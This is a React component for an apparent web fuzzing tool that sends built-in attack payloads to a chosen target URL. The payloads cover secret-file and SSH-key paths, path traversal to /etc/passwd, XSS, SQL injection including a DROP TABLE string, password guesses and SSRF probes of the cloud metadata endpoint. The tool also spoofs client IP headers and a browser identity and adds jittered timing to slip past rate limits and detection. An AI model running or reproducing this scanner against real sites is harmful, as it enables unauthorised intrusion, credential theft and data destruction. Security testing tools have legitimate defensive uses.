import { useState, useRef } from "react";
import { C } from "../lib/constants.js";
import { sendRequest, validateHost } from "../lib/api.js";
import { Panel, Btn, Tag, Inp } from "../components/ui.jsx";

const PRESETS = {
  paths: [
    "/.env", "/.env.local", "/.env.example", "/.env.dev", "/.env.prod", "/.env.backup",
    "/.git/config", "/.git/HEAD", "/.gitignore", "/.htaccess", "/.htpasswd",
    "/.svn/entries", "/.hg/hgrc",
    "/Dockerfile", "/docker-compose.yml", "/.dockerignore", "/.railway", "/railway.json",
    "/health", "/metrics", "/status", "/healthcheck", "/actuator/health", "/actuator/env",
    "/%2e/admin", "//admin", "/admin", "/login", "/api", "/wp-admin", "/administrator",
    "/backup", "/upload", "/dashboard", "/users", "/panel", "/secret", "/test", "/debug",
    "/phpinfo.php", "/xmlrpc.php", "/server-status", "/server-info",
    "/package.json", "/package-lock.json", "/yarn.lock", "/pnpm-lock.yaml",
    "/server.js", "/index.js", "/app.js", "/config.json", "/config.yml", "/settings.json",
    "/..%2f..%2f..%2fetc/passwd", "/..%2f..%2f..%2fwindows/win.ini",
    "/error.log", "/access.log", "/debug.log", "/app.log", "/server.log",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql", "/db.sql", "/db.sqlite", "/db.sqlite3",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.well-known/security.txt", "/swagger.json", "/swagger-ui.html", "/api-docs", "/graphql", "/graphiql",
    "/wp-config.php", "/wp-content/debug.log", "/.vscode/settings.json", "/.idea/workspace.xml",
    "/.DS_Store", "/Thumbs.db", "/web.config", "/.bash_history", "/.ssh/id_rsa"
  ],
  xss: ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>', "javascript:alert(1)", "'><svg onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<img src=x onerror=alert('xss')>"],
  sqli: ["'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "1; DROP TABLE users--", "1 UNION SELECT null--", "' AND SLEEP(5)--", "admin'--", "1' OR '1'='1"],
  passwords: ["password", "123456", "admin", "letmein", "welcome", "qwerty", "pass123", "admin123", "root", "toor", "password1", "monkey"],
  ssrf: ["http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "http://[::1]", "http://0.0.0.0", "https://127.0.0.1"],
};

export default function FuzzerTab({ proxyOnline }) {
  const [url, setUrl] = useState("https://target.com/page?id=§1§");
  const [wordlistText, setWordlistText] = useState("");
  const [preset, setPreset] = useState("auto");
  const [results, setResults] = useState([]);
  const [running, setRunning] = useState(false);
  const [filter, setFilter] = useState("");
  const [sel, setSel] = useState(null);

  // Engine State
  const [smartSpeed, setSmartSpeed] = useState(true);
  const [jitterMax, setJitterMax] = useState(200);
  const [currentTick, setCurrentTick] = useState(1000);

  const abortRef = useRef(null);

  const startFuzz = async () => {
    if (!url.includes("§")) { alert("URL must contain §markers§"); return; }
    const baseUrl = url.includes("://") ? url : "https://" + url;
    
    let payloads = [];
    if (preset === "auto") {
      const markerIndex = url.indexOf("§");
      const qIndex = url.indexOf("?");
      if (qIndex !== -1 && markerIndex > qIndex) {
         const paramContext = url.slice(qIndex, markerIndex);
         if (/url=|redirect=|path=|uri=|dest=|link=|file=|window=|next=/i.test(paramContext)) payloads = PRESETS.ssrf;
         else if (/id=|page=|num=|count=|offset=|user_id=|group=|limit=/i.test(paramContext)) payloads = PRESETS.sqli;
         else payloads = PRESETS.xss;
      } else {
         payloads = PRESETS.paths;
      }
    } else {
      payloads = wordlistText.trim()
        ? wordlistText.split("\n").map(l => l.trim()).filter(Boolean)
        : PRESETS[preset] || [];
    }
    if (payloads.length === 0) return;

    setRunning(true);
    setResults([]);
    abortRef.current = { cancelled: false };
    const ab = abortRef.current;

    let currentDelay = 1000;

    for (const payload of payloads) {
      if (ab.cancelled) break;
      const testUrl = baseUrl.replace(/§[^§]*§/g, encodeURIComponent(payload));
      let parsed;
      try { parsed = new URL(testUrl); } catch { continue; }
      if (validateHost(parsed.hostname)) continue;

      const t = Date.now();
      try {
        const rnd = () => Math.floor(Math.random() * 255);
        const randomIp = `${rnd() + 1}.${rnd()}.${rnd()}.${rnd()}`;
        const headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
          "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
          "Sec-Ch-Ua-Mobile": "?0",
          "Sec-Ch-Ua-Platform": '"Windows"',
          "X-Forwarded-For": randomIp,
          "X-Real-IP": randomIp
        };

        const r = await sendRequest({ url: testUrl, method: "GET", headers });
        const elapsed = Date.now() - t;

        // Smart Speed logic
        if (smartSpeed) {
          if (elapsed > 2000) currentDelay += 500;
          else if (elapsed < 500) currentDelay = Math.max(500, currentDelay - 200);
        } else {
          currentDelay = 1000; // Reset or fixed mode
        }

        setResults(prev => [...prev, {
          id: crypto.randomUUID(),
          payload,
          url: testUrl,
          status: r.status || 0,
          length: r.body?.length || 0,
          time: elapsed,
          body: r.body || "",
          headers: r.headers || {},
        }]);
      } catch {
        setResults(prev => [...prev, { id: crypto.randomUUID(), payload, url: testUrl, status: "ERR", length: 0, time: 0, body: "", headers: {} }]);
      }

      // Calculate Jitter
      let finalDelay = currentDelay;
      if (jitterMax > 0) {
        finalDelay += Math.floor(Math.random() * (jitterMax * 2 + 1)) - jitterMax;
      }
      finalDelay = Math.max(100, finalDelay); // Prevent extremely small or negative delays
      
      setCurrentTick(finalDelay);
      await new Promise(r => setTimeout(r, finalDelay));
    }
    setRunning(false);
  };

  const stop = () => {
    abortRef.current.cancelled = true;
    setRunning(false);
  };

  const selEntry = sel ? results.find(r => r.id === sel) : null;
  const filteredResults = filter
    ? results.filter(r => String(r.status).includes(filter))
    : results;

  return (
    <div style={{ display: "flex", gap: 8, height: "100%", minHeight: 520 }}>
      <Panel style={{ flex: 1, display: "flex", flexDirection: "column" }}>
        {/* Toolbar */}
        <div style={{ padding: "8px 12px", borderBottom: `1px solid ${C.border}`, display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
          <Inp
            value={url}
            onChange={setUrl}
            placeholder="https://target.com/§payload§"
            style={{ flex: 1, minWidth: 200 }}
          />
          <select
            value={preset}
            onChange={e => { setPreset(e.target.value); setWordlistText(""); }}
            style={{ background: C.bg, border: `1px solid ${C.border}`, color: C.text, padding: "6px 8px", borderRadius: 4, fontFamily: "monospace", fontSize: 11 }}
          >
            <option value="auto">✨ Smart Auto</option>
            <option value="paths">Paths</option>
            <option value="xss">XSS</option>
            <option value="sqli">SQLi</option>
            <option value="ssrf">SSRF</option>
            <option value="passwords">Passwords</option>
            <option value="custom">Custom</option>
          </select>
          <Btn onClick={running ? stop : startFuzz} active color={running ? C.red : C.accent} small>
            {running ? "⊘ Stop" : "⚔ Start"}
          </Btn>
        </div>

        {/* Engine Settings */}
        <div style={{ padding: "8px 12px", borderBottom: `1px solid ${C.border}`, display: "flex", gap: 16, alignItems: "center", flexWrap: "wrap", background: C.bg + "40" }}>
          <div style={{ color: C.muted, fontSize: 10, fontWeight: "bold" }}>ENGINE SETTINGS</div>
          <label style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11, cursor: "pointer", color: C.text }}>
            <input type="checkbox" checked={smartSpeed} onChange={e => setSmartSpeed(e.target.checked)} />
            Enable Smart Speed
          </label>
          <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 11, color: C.text }}>
            <span style={{ color: C.muted }}>Jitter:</span>
            <input type="range" min="0" max="1000" step="50" value={jitterMax} onChange={e => setJitterMax(Number(e.target.value))} style={{ width: 80 }} />
            <span style={{ fontFamily: "monospace", width: 35 }}>{jitterMax}ms</span>
          </div>
          <div style={{ marginLeft: "auto", fontSize: 11, fontFamily: "monospace", color: C.accent, padding: "2px 6px", background: C.border + "40", borderRadius: 4 }}>
            Current Tick: {currentTick}ms
          </div>
        </div>

        {preset === "custom" && (
          <div style={{ padding: "8px 12px", borderBottom: `1px solid ${C.border}` }}>
            <div style={{ color: C.muted, fontSize: 10, marginBottom: 4 }}>CUSTOM WORDLIST</div>
            <textarea
              value={wordlistText}
              onChange={e => setWordlistText(e.target.value)}
              placeholder="One payload per line"
              style={{
                width: "100%",
                height: 80,
                background: C.bg,
                border: `1px solid ${C.border}`,
                color: C.text,
                fontFamily: "monospace",
                fontSize: 11,
                padding: 6,
                resize: "vertical",
                boxSizing: "border-box",
                borderRadius: 4,
              }}
            />
          </div>
        )}

        {/* Filter bar */}
        <div style={{ padding: "8px 12px", borderBottom: `1px solid ${C.border}`, display: "flex", gap: 8, alignItems: "center" }}>
          <span style={{ color: C.muted, fontSize: 10 }}>Filter:</span>
          <input
            type="text"
            value={filter}
            onChange={e => setFilter(e.target.value)}
            placeholder="Status code (e.g., 200)"
            style={{
              background: C.bg,
              border: `1px solid ${C.border}`,
              color: C.text,
              padding: "4px 8px",
              borderRadius: 4,
              fontFamily: "monospace",
              fontSize: 11,
              flex: 1,
            }}
          />
          <span style={{ color: C.muted, fontSize: 10 }}>{filteredResults.length} / {results.length}</span>
        </div>

        {/* Results table */}
        <div style={{ flex: 1, overflowY: "auto", borderRight: `1px solid ${C.border}` }}>
          {results.length === 0 ? (
            <div style={{ padding: 12, color: C.muted, fontSize: 11, fontFamily: "monospace" }}>
              {running ? "Fuzzing..." : "No results yet"}
            </div>
          ) : (
            <div>
              <div style={{ display: "flex", gap: 8, padding: "6px 12px", borderBottom: `1px solid ${C.border}`, position: "sticky", top: 0, background: C.panel, color: C.muted, fontSize: 9, fontWeight: "bold" }}>
                <div style={{ flex: 1, maxWidth: 150 }}>Payload</div>
                <div style={{ width: 50 }}>Status</div>
                <div style={{ width: 60 }}>Length</div>
                <div style={{ width: 50 }}>Time</div>
              </div>
              {filteredResults.map(r => {
                const interesting = r.status !== 404 && r.status !== "ERR" && r.status !== 400;
                return (
                  <div
                    key={r.id}
                    onClick={() => setSel(r.id)}
                    style={{
                      display: "flex",
                      gap: 8,
                      padding: "6px 12px",
                      borderBottom: `1px solid ${C.border}12`,
                      borderLeft: sel === r.id ? `2px solid ${C.accent}` : "2px solid transparent",
                      background: interesting ? C.border + "20" : "transparent",
                      cursor: "pointer",
                      alignItems: "center",
                    }}
                  >
                    <div style={{ flex: 1, maxWidth: 150, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", fontFamily: "monospace", fontSize: 10 }}>
                      {r.payload.slice(0, 40)}
                    </div>
                    <div style={{ width: 50, fontFamily: "monospace", fontSize: 10, color: r.status < 300 ? C.green : r.status < 400 ? C.blue : r.status === "ERR" ? C.red : C.muted }}>
                      {r.status}
                    </div>
                    <div style={{ width: 60, fontFamily: "monospace", fontSize: 10, color: C.muted }}>
                      {(r.length / 1024).toFixed(1)}KB
                    </div>
                    <div style={{ width: 50, fontFamily: "monospace", fontSize: 10, color: C.muted }}>
                      {r.time}ms
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </Panel>

      {/* Detail panel */}
      {selEntry && (
        <Panel style={{ width: 300, flexShrink: 0, display: "flex", flexDirection: "column" }}>
          <div style={{ padding: "6px 12px", borderBottom: `1px solid ${C.border}`, color: C.muted, fontSize: 10, letterSpacing: 1 }}>DETAIL</div>
          <div style={{ flex: 1, overflowY: "auto", padding: 12 }}>
            <div style={{ color: C.muted, fontSize: 10, marginBottom: 8 }}>Payload</div>
            <div style={{ fontFamily: "monospace", fontSize: 11, color: C.text, marginBottom: 12, wordBreak: "break-all" }}>
              {selEntry.payload}
            </div>
            <div style={{ color: C.muted, fontSize: 10, marginBottom: 8 }}>Status</div>
            <div style={{ fontFamily: "monospace", fontSize: 11, color: selEntry.status < 300 ? C.green : selEntry.status < 400 ? C.blue : C.red, marginBottom: 12 }}>
              {selEntry.status}
            </div>
            <div style={{ color: C.muted, fontSize: 10, marginBottom: 8 }}>Response Preview</div>
            <pre style={{ margin: 0, fontFamily: "monospace", fontSize: 10, color: C.muted, whiteSpace: "pre-wrap", wordBreak: "break-all", maxHeight: 300, overflowY: "auto" }}>
              {selEntry.body.slice(0, 1000)}{selEntry.body.length > 1000 ? "\n[truncated]" : ""}
            </pre>
          </div>
        </Panel>
      )}
    </div>
  );
}
